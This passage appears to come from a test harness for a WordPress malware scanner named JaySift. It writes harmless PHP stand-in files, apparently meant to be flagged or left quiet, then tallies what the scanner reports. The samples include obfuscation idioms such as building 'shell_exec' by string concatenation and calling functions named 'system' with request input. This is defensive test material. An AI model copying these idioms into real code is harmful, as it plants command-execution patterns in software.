      "$fn = 'shell' . '_exec';",
      "$can = function_exists($fn);",
      "$fn = 'esc_html';",
      "echo $fn($_GET['label']);"
    )
  },
  {
    path: `${P}/includes/class-report.php`,
    group: "clean",
    set: "calls-by-name",
    technique: "methods and classes that share a command function's name",
    expect: "quiet",
    content: text(
      "<?php",
      "$section = 'system';",
      "echo esc_html($report->$section($_GET['tab']));",
      "echo esc_html(Acme_Report::$section($_GET['tab']));",
      "$panel = new $section($_GET['tab']);",
      "call_user_func(array($report, 'system'), $_GET['tab']);",
      "call_user_func('Acme_Report::system', $_GET['tab']);",
      "array_map('acme_system_row', (array) $_POST['rows']);"
    )
  }
];

/**
 * Write the corpus under `dir/site` and a manifest beside it.
 * @returns {Promise<{root:string, manifest:string, files:Array}>}
 */
export async function buildCorpus(dir) {
  const root = path.join(dir, "site");
  const files = [];
  for (const item of CORPUS) {
    const full = path.join(root, ...item.path.split("/"));
    await fs.mkdir(path.dirname(full), { recursive: true });
    await fs.writeFile(full, item.content);
    files.push({ path: item.path, group: item.group, set: item.set || "base", technique: item.technique, expect: item.expect });
  }
  const manifest = path.join(dir, "manifest.json");
  await fs.writeFile(
    manifest,
    JSON.stringify(
      {
        about: "Harmless stand-ins for measuring JaySift. Nothing here is malware.",
        groups: countBy(files, "group"),
        files
      },
      null,
      2
    ) + "\n"
  );
  return { root, manifest, files };
}

function countBy(list, key) {
  const out = {};
  for (const item of list) out[item[key]] = (out[item[key]] || 0) + 1;
  return out;
}

const RANK = { critical: 4, high: 3, medium: 2, low: 1 };

/**
 * Scan a built corpus with a given scan() and count what happened.
 *
 * @param {string} root            the corpus `site` folder
 * @param {Function} scan          scan() from the scanner under test
 * @param {object} [options]       passed to scan()
 */
export async function measure(root, scan, options = {}) {
  const result = await scan([root], options);
  const records = result.flagged || result.infected;
  const byPath = new Map();
  for (const record of records) {
    const rel = path.relative(root, record.path).split(path.sep).join("/");
    const top = record.findings.reduce((a, f) => ((RANK[f.severity] || 0) > (RANK[a] || 0) ? f.severity : a), null);
    byPath.set(rel, { top, rules: record.findings.map((f) => f.id) });
  }

  const groups = {};
  const sets = {};
  const files = [];
  for (const item of CORPUS) {
    const hit = byPath.get(item.path) || null;
    const set = item.set || "base";
    for (const g of [(groups[item.group] ||= { total: 0, flagged: 0, serious: 0 }), ((sets[set] ||= {})[item.group] ||= { total: 0, flagged: 0, serious: 0 })]) {
      g.total++;
      if (hit) g.flagged++;
      if (hit && RANK[hit.top] >= RANK.high) g.serious++;
    }
    files.push({ ...item, set, content: undefined, top: hit ? hit.top : null, rules: hit ? hit.rules : [] });
  }
  return { groups, sets, files };
}
